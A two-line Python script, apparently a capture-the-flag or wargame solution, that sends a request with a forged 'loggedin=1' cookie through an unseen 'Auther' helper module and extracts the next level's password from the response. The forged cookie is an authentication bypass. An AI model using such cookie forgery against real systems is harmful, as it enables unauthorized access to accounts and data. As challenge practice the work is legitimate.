import Auther
Auther.passwordIsGetter(Auther.request(5, cookies={"loggedin": "1"}).text, 6)()
